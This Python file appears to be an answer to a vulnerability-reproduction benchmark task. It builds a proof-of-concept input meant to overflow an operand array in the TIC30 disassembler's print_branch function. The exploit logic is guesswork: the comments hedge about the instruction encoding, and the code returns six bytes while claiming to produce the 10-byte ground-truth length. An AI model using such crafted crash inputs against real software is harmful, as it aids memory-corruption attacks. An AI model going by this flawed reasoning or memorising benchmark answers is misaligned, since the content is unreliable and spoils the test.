import os
import struct
import tarfile
import tempfile
import subprocess

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is in print_branch function in tic30-dis.c
        # We need to create a corrupt TIC30 binary that triggers the overflow
        # Ground truth length is 10 bytes
        
        # Create a minimal TIC30 binary that will trigger the buffer overflow
        # The exact structure needs to be based on the vulnerability description
        
        # Based on the vulnerability: incorrect size of operand array in print_branch
        # We need to craft a branch instruction with malformed operands
        
        # TIC30 is a 32-bit DSP processor. Instructions are 32-bit words.
        # Branch instructions likely have opcode + displacement/address
        
        # We'll create a minimal binary with a branch instruction that has
        # malformed operands to trigger the array overrun
        
        # Format: 32-bit instruction words
        # We need 10 bytes total (not multiple of 4, so last instruction is partial)
        
        poc = bytearray()
        
        # First word: Branch instruction opcode with flags to enter print_branch
        # We need to set opcode bits that will be recognized as a branch
        # Looking at typical TIC30 encoding:
        # Bits 31-29: Opcode group, 100 for branch
        # Bits 28-24: Condition code
        # Bits 23-0: Displacement
        
        # Create a branch instruction that will be processed by print_branch
        # Opcode 100 in bits 31-29 = 0x80000000
        # Condition code 00000 (unconditional) in bits 28-24 = 0x00000000
        # Displacement (we'll make it point to create overflow)
        
        # Word 1: Branch instruction
        branch_instr = 0x80000000  # Unconditional branch
        poc.extend(struct.pack('>I', branch_instr))
        
        # Word 2: Create malformed operand that will cause array overrun
        # We need to trigger the incorrect size calculation
        # The vulnerability likely involves reading beyond operand array bounds
        # We'll set a value that causes out-of-bounds access
        
        # We have 2 bytes left (10 - 8 = 2)
        # Append 2 bytes that will be read as additional operand data
        # These bytes will cause the array index to go out of bounds
        
        # Use 0xFF bytes to potentially cause maximum index
        poc.extend(b'\xFF\xFF')
        
        return bytes(poc)